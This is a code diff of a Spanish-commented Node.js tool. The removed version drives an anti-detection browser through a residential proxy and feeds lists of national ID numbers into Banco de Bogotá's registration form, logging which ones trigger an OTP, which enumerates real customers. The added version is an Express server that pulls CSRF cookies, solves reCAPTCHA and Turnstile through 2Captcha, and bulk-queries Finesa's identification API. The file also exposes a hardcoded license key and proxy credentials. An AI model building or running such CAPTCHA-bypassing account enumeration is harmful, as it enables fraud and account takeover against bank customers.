@@ -1,176 +1,267 @@
-const { launchPersistentContext } = require('cloakbrowser');
+require('dotenv').config();
+const express = require('express');
+const cors = require('cors');
+const { execFileSync } = require('child_process');
 const fs = require('fs');
 const path = require('path');
+const os = require('os');
+
+const app = express();
+const PORT = process.env.PORT || 3000;
+const FINESA_URL = 'https://pagos.finesa.com.co';
+
+// 2Captcha
+const CAPTCHA_KEY = process.env.CAPTCHA_KEY || '';
+const RECAPTCHA_SITEKEY = '6LddR80oAAAAADtO0X7hLL55sKnYVNvODdu_xVst';
+const TURNSTILE_SITEKEY = '0x4AAAAAAFAMEbzOhnNsw4Vz';
+
+// Proxy Geonode
+const GEONODE_USER = process.env.GEONODE_USER || '';
+const GEONODE_PASS = process.env.GEONODE_PASS || '';
+const GEONODE_HOST = process.env.GEONODE_HOST || '92.204.171.83';
+const GEONODE_PORT = process.env.GEONODE_PORT || '9000';
+const useProxy = !!GEONODE_USER;
+
+const isWin = os.platform() === 'win32';
+const devNull = isWin ? 'NUL' : '/dev/null';
+
+app.use(cors());
+app.use(express.json());
+app.use(express.static(__dirname));
+
+const DOCUMENT_TYPES = {
+  '1': 'Cédula de ciudadanía',
+  '2': 'Cédula de extranjería',
+  '3': 'NIT',
+};
 
 // ============================================================
-// CONFIGURACIÓN
+// 2CAPTCHA — resolver reCAPTCHA v3 y Turnstile
 // ============================================================
-const URL_FORMULARIO = 'https://virtual.bancodebogota.co/clave-segura/registro/validacion-cliente'; 
-const ARCHIVO_CEDULAS = 'cedulas.txt';
-const ARCHIVO_OTP = 'pendientes_otp.txt';
 
-const CARPETA_PERFIL = path.join(__dirname, 'perfil_cloak_real');
+async function solve2Captcha(type, sitekey, pageUrl) {
+  // type: 'recaptchav3' o 'turnstile'
+  const startTime = Date.now();
 
-// 🌟 TU CLAVE DE LICENCIA
-const LICENSE_KEY = 'cb_debb6498264241f695c276fdb89df568';
-
-// Proxy (Asegúrate de que el puerto 9000 sea el residencial/rotativo)
-const PROXY_URL = 'http://geonode_PKlL1yvoTG:605d224e-19b6-4baa-8107-296ee7d836f5@92.204.171.83:9000';
-
-const sleep = (ms) => new Promise(r => setTimeout(r, ms));
-
-function leerCedulas() {
-  try {
-    return fs.readFileSync(ARCHIVO_CEDULAS, 'utf8').split(/\r?\n/).map(l => l.trim()).filter(Boolean);
-  } catch (e) { return []; }
-}
-
-function guardarOTP(cedula) {
-  fs.appendFileSync(ARCHIVO_OTP, `${cedula}\t${new Date().toISOString()}\n`, 'utf8');
-  console.log(`   📝 OTP guardado en archivo: ${cedula}`);
-}
-
-// ============================================================
-// FLUJO PRINCIPAL
-// ============================================================
-(async () => {
-  const cedulas = leerCedulas();
-  if (cedulas.length === 0) return console.log('❌ No hay cédulas');
-  if (!fs.existsSync(ARCHIVO_OTP)) fs.writeFileSync(ARCHIVO_OTP, '', 'utf8');
-
-  const esPerfilNuevo = !fs.existsSync(CARPETA_PERFIL);
-  if (esPerfilNuevo) {
-      console.log('   🔥 PERFIL NUEVO. Se abrirá Google para calentar la sesión.');
+  let submitUrl;
+  if (type === 'recaptchav3') {
+    submitUrl = `http://2captcha.com/in.php?key=${CAPTCHA_KEY}&method=userrecaptcha&googlekey=${sitekey}&pageurl=${encodeURIComponent(pageUrl)}&version=v3&action=verify&min_score=0.5&json=1`;
+  } else {
+    // Turnstile
+    submitUrl = `http://2captcha.com/in.php?key=${CAPTCHA_KEY}&method=turnstile&sitekey=${sitekey}&pageurl=${encodeURIComponent(pageUrl)}&json=1`;
   }
 
-  let context = null;
-  try {
-    if (!fs.existsSync(CARPETA_PERFIL)) {
-        fs.mkdirSync(CARPETA_PERFIL, { recursive: true });
-    }
+  console.log(`[2CAPTCHA] Enviando ${type}...`);
 
-    console.log(`   🛡️ Iniciando CloakBrowser Pro...`);
-    context = await launchPersistentContext({
-        userDataDir: CARPETA_PERFIL,
-        license_key: LICENSE_KEY, // 🌟 Tu clave integrada
-        headless: false, 
-        humanize: true,  
-        human_preset: 'careful', 
-        proxy: PROXY_URL,
-        geoip: true, 
-        args: [
-            '--start-maximized',
-            // 🌟 Flags recomendados por la documentación de CloakBrowser para proxies difíciles
-            '--fingerprint-transparent-proxy',
-            '--license-route=proxy', // Valida la licencia a través del proxy para no usar tu IP real
-            '--disable-blink-features=AutomationControlled'
-        ]
-    });
-    
-    const page = context.pages()[0] || await context.newPage();
+  // Enviar tarea
+  const submitArgs = ['-s', submitUrl];
+  const submitRes = JSON.parse(execFileSync('curl', submitArgs, { encoding: 'utf8', timeout: 30000 }));
 
-    // 🌟 CALENTAMIENTO
-    if (esPerfilNuevo) {
-        await page.goto('https://www.google.com', { waitUntil: 'networkidle' });
-        console.log('   ⏳ Navega un poco en Google durante 20 segundos (haz búsquedas, clics)...');
-        await sleep(20000); 
-    }
-
-    // PROCESAMIENTO
-    for (let i = 0; i < cedulas.length; i++) {
-      const cedula = cedulas[i];
-      console.log(`\n[${i + 1}/${cedulas.length}] Cédula: ${cedula}`);
-
-      try {
-        console.log(`   🔄 Navegando al formulario...`);
-        await page.goto(URL_FORMULARIO, { waitUntil: 'networkidle', timeout: 60000 });
-        await sleep(8000 + Math.floor(Math.random() * 3000)); 
-
-        console.log('   🖱️  Haciendo clic en el input...');
-        const selectorInput = '.S4rA9R8LnfmmUe06aTrJTg\\=\\= > div';
-        await page.waitForSelector(selectorInput, { timeout: 15000 });
-        
-        await page.click(selectorInput);
-        await sleep(1500);
-
-        console.log('   ⌨️  Escribiendo la cédula...');
-        await page.type(selectorInput, cedula, { delay: 150 }); 
-        await sleep(2500);
-
-        console.log('   🖱️  Clic en Verificar...');
-        const btnSelector = 'button[data-testid="verify-button"]';
-        await page.waitForSelector(btnSelector);
-        await page.click(btnSelector);
-
-        console.log('   ⏳ Analizando respuesta...');
-        let resultado = 'desconocido';
-        const urlInicial = page.url();
-
-        for (let t = 0; t < 15; t++) {
-          await sleep(1000);
-          
-          resultado = await page.evaluate((urlInicial) => {
-            const bodyText = document.body.innerText.toLowerCase();
-
-            if (bodyText.includes('no es posible realizar la operación') || bodyText.includes('en este momento no es posible')) {
-               return 'bloqueo_banco';
-            }
-
-            const modal = document.querySelector('[data-testid="notification-modal"]');
-            if (modal) {
-               const rect = modal.getBoundingClientRect();
-               if (rect.width > 0 && rect.height > 0 && window.getComputedStyle(modal).display !== 'none') {
-                   if (bodyText.includes('tus datos no coinciden')) return 'no_coincide';
-               }
-            }
-            
-            const inputOtp = document.querySelector('input[name*="otp" i], input[placeholder*="código" i], input[id*="otp" i]');
-            if (inputOtp) {
-                const rect = inputOtp.getBoundingClientRect();
-                if (rect.width > 0 && rect.height > 0) return 'otp';
-            }
-
-            const urlActual = window.location.href;
-            if (urlActual !== urlInicial && (urlActual.includes('clave-segura') || bodyText.includes('clave segura'))) {
-                return 'otp';
-            }
-
-            const regexOtp = /(c[oó]digo de verificaci[oó]n|ingresa el c[oó]digo|te enviamos un c[oó]digo|digita el c[oó]digo|sms|token|pin de seguridad)/i;
-            if (regexOtp.test(bodyText)) return 'otp';
-
-            return 'esperando';
-          }, urlInicial);
-
-          if (resultado !== 'esperando') break;
-        }
-
-        if (resultado === 'otp') {
-          console.log('   🔐 ¡Pide OTP / Clave Segura detectada!');
-          guardarOTP(cedula);
-        } else if (resultado === 'no_coincide') {
-          console.log('   ⚠️  Cédula no existe (Tus datos no coinciden)');
-        } else if (resultado === 'bloqueo_banco') {
-          console.log('   🚫 Bloqueo persistente.');
-        } else {
-          console.log('   ❓ No identificado.');
-        }
-
-      } catch (err) {
-        console.error(`   ❌ Error en cédula: ${err.message}`);
-      }
-      
-      console.log('   ⏳ Pasando a la siguiente cédula...');
-      await sleep(10000 + Math.floor(Math.random() * 5000)); 
-    }
-
-  } catch (globalErr) {
-      console.error('❌ Error crítico:', globalErr);
-  } finally {
-      if (context) {
-          await context.close();
-          console.log('   🔒 Navegador cerrado limpiamente (sesión liberada).');
-      }
+  if (submitRes.status !== 1) {
+    throw new Error(`2Captcha submit error: ${submitRes.request || JSON.stringify(submitRes)}`);
   }
-  
-  console.log('\n✅ PROCESO TERMINADO.');
-})();
+
+  const taskId = submitRes.request;
+  console.log(`[2CAPTCHA] ${type} taskId: ${taskId}`);
+
+  // Polling hasta que esté listo (máx 120 seg)
+  for (let i = 0; i < 40; i++) {
+    await new Promise(r => setTimeout(r, 3000)); // esperar 3 seg entre polls
+
+    const pollUrl = `http://2captcha.com/res.php?key=${CAPTCHA_KEY}&action=get&id=${taskId}&json=1`;
+    const pollArgs = ['-s', pollUrl];
+
+    try {
+      const pollRes = JSON.parse(execFileSync('curl', pollArgs, { encoding: 'utf8', timeout: 15000 }));
+
+      if (pollRes.status === 1) {
+        const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
+        console.log(`[2CAPTCHA] ✓ ${type} resuelto en ${elapsed}s`);
+        return pollRes.request; // el token
+      }
+
+      if (pollRes.request !== 'CAPCHA_NOT_READY') {
+        throw new Error(`2Captcha error: ${pollRes.request}`);
+      }
+    } catch (e) {
+      if (e.message.includes('2Captcha error')) throw e;
+      // Error de red, reintentar
+    }
+  }
+
+  throw new Error(`2Captcha timeout para ${type}`);
+}
+
+// ============================================================
+// OBTENER CSRF TOKEN (cookies de Laravel)
+// ============================================================
+
+function getCsrfToken() {
+  const cookieJar = path.join(__dirname, `cookies_${Date.now()}.txt`);
+
+  const args = [
+    '-s', '-o', devNull,
+    '-c', cookieJar,
+    '-H', 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    '-H', 'Accept: text/html,application/xhtml+xml',
+  ];
+
+  if (useProxy) {
+    args.push('-x', `http://${GEONODE_USER}:${GEONODE_PASS}@${GEONODE_HOST}:${GEONODE_PORT}`);
+  }
+
+  args.push(`${FINESA_URL}/autenticacion`);
+
+  try {
+    execFileSync('curl', args, { encoding: 'utf8', timeout: 30000 });
+  } catch (e) {
+    console.error('[CSRF] Error en GET:', e.message);
+  }
+
+  // Leer cookies
+  let xsrfToken = '';
+  let allCookies = '';
+
+  if (fs.existsSync(cookieJar)) {
+    const content = fs.readFileSync(cookieJar, 'utf8');
+    const lines = content.split('\n');
+
+    const cookies = [];
+    for (const line of lines) {
+      if (line.startsWith('#') || !line.trim()) continue;
+      const parts = line.split('\t');
+      if (parts.length >= 7) {
+        cookies.push(`${parts[5]}=${parts[6]}`);
+        if (parts[5] === 'XSRF-TOKEN') {
+          xsrfToken = decodeURIComponent(parts[6]);
+        }
+      }
+    }
+    allCookies = cookies.join('; ');
+
+    // Limpiar
+    try { fs.unlinkSync(cookieJar); } catch {}
+  }
+
+  console.log(`[CSRF] XSRF-TOKEN: ${xsrfToken ? xsrfToken.substring(0, 20) + '...' : 'NO ENCONTRADO'}`);
+  console.log(`[CSRF] Cookies: ${allCookies ? allCookies.substring(0, 60) + '...' : 'NINGUNA'}`);
+
+  return { xsrfToken, cookies: allCookies };
+}
+
+// ============================================================
+// LLAMAR API DE FINESA
+// ============================================================
+
+function callFinesaApi(documentType, identification, recaptchaToken, turnstileToken, xsrfToken, cookies) {
+  const body = JSON.stringify({
+    documentType,
+    identification,
+    recaptchaToken,
+    turnstileToken,
+  });
+
+  const args = [
+    '-s',
+    '-X', 'POST',
+    `${FINESA_URL}/api/auth/verify-identification`,
+    '-H', 'Content-Type: application/json',
+    '-H', 'Accept: application/json',
+    '-H', `X-XSRF-TOKEN: ${xsrfToken}`,
+    '-H', `Cookie: ${cookies}`,
+    '-H', `Referer: ${FINESA_URL}/autenticacion`,
+    '-H', `Origin: ${FINESA_URL}`,
+    '-H', 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    '-H', 'sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+    '-H', 'sec-ch-ua-mobile: ?0',
+    '-H', 'sec-ch-ua-platform: "Windows"',
+    '-H', 'Sec-Fetch-Dest: empty',
+    '-H', 'Sec-Fetch-Mode: cors',
+    '-H', 'Sec-Fetch-Site: same-origin',
+    '--data-raw', body,
+  ];
+
+  if (useProxy) {
+    args.push('-x', `http://${GEONODE_USER}:${GEONODE_PASS}@${GEONODE_HOST}:${GEONODE_PORT}`);
+  }
+
+  const result = execFileSync('curl', args, { encoding: 'utf8', timeout: 30000 });
+  return JSON.parse(result);
+}
+
+// ============================================================
+// ENDPOINTS
+// ============================================================
+
+app.use((req, res, next) => {
+  console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
+  next();
+});
+
+app.get('/api/health', (req, res) => {
+  res.json({ status: 'ok', captchaKey: !!CAPTCHA_KEY, proxy: useProxy });
+});
+
+app.get('/api/document-types', (req, res) => {
+  res.json({
+    success: true,
+    data: Object.entries(DOCUMENT_TYPES).map(([value, label]) => ({ value, label })),
+  });
+});
+
+app.post('/api/verify', async (req, res) => {
+  const { documentType, identification } = req.body;
+
+  if (!documentType || !identification) {
+    return res.status(400).json({ success: false, error: 'Se requiere documentType e identification' });
+  }
+  if (!DOCUMENT_TYPES[documentType]) {
+    return res.status(400).json({ success: false, error: 'Tipo de documento inválido' });
+  }
+  if (!CAPTCHA_KEY) {
+    return res.status(500).json({ success: false, error: 'Falta CAPTCHA_KEY en .env' });
+  }
+
+  try {
+    const start = Date.now();
+    console.log(`\n[VERIFY] === ${identification} (${DOCUMENT_TYPES[documentType]}) ===`);
+
+    // PASO 1: Obtener CSRF cookies
+    console.log('[VERIFY] Paso 1: Obteniendo CSRF...');
+    const { xsrfToken, cookies } = getCsrfToken();
+
+    if (!xsrfToken) {
+      return res.status(502).json({ success: false, error: 'No se pudo obtener XSRF-TOKEN de Finesa' });
+    }
+
+    // PASO 2: Resolver captchas EN PARALELO
+    console.log('[VERIFY] Paso 2: Resolviendo captchas en paralelo...');
+    const [recaptchaToken, turnstileToken] = await Promise.all([
+      solve2Captcha('recaptchav3', RECAPTCHA_SITEKEY, `${FINESA_URL}/autenticacion`),
+      solve2Captcha('turnstile', TURNSTILE_SITEKEY, `${FINESA_URL}/autenticacion`),
+    ]);
+
+    // PASO 3: Llamar API de Finesa
+    console.log('[VERIFY] Paso 3: Llamando API de Finesa...');
+    const result = callFinesaApi(documentType, identification, recaptchaToken, turnstileToken, xsrfToken, cookies);
+
+    const elapsed = ((Date.now() - start) / 1000).toFixed(1);
+    console.log(`[VERIFY] ✓ Respuesta en ${elapsed}s:`, JSON.stringify(result).substring(0, 300));
+
+    res.json({ success: true, data: result });
+
+  } catch (error) {
+    console.error(`[VERIFY] Error:`, error.message);
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// ============================================================
+app.listen(PORT, () => {
+  console.log(`\n╔════════════════════════════════════════════════════════╗`);
+  console.log(`║  Finesa Proxy v9 (2Captcha + curl, sin Puppeteer)      ║`);
+  console.log(`║  http://localhost:${PORT}                                  ║`);
+  console.log(`║  Proxy: ${useProxy ? `${GEONODE_HOST}:${GEONODE_PORT}` : 'DESACTIVADO'}                          ║`);
+  console.log(`║  2Captcha: ${CAPTCHA_KEY ? 'CONFIGURADO' : '⚠ FALTA CAPTCHA_KEY'}                     ║`);
+  console.log(`╚════════════════════════════════════════════════════════╝\n`);
+});
